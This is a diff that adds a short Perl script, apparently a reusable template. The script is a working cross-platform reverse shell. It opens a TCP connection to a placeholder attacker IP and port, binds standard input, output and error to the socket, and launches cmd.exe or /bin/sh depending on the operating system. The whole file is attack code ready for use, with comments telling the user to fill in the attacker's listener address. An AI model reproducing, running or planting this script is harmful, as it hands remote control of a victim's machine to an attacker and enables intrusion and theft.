@@ -1,0 +1,27 @@
+use strict;
+use Socket;
+use IO::Socket;
+
+# Configuration
+my $ip   = "__IPADDR__";   # Change to your attacker's IP
+my $port = __PORT__;         # Change to your attacker's listening port
+
+# Detect OS
+my $shell = ($^O =~ /win/i) ? "cmd.exe" : "/bin/sh";  # Select shell based on OS
+print "[+] Detected OS: $^O, Using shell: $shell\n";
+
+# Establish reverse connection
+my $socket = IO::Socket::INET->new(
+    Proto    => "tcp",
+    PeerAddr => $ip,
+    PeerPort => $port
+) or die "[-] Failed to connect: $!\n";
+
+# Redirect I/O streams to the socket
+open(STDIN, ">&", $socket);
+open(STDOUT, ">&", $socket);
+open(STDERR, ">&", $socket);
+
+# Execute the appropriate shell dynamically
+system($shell);
+
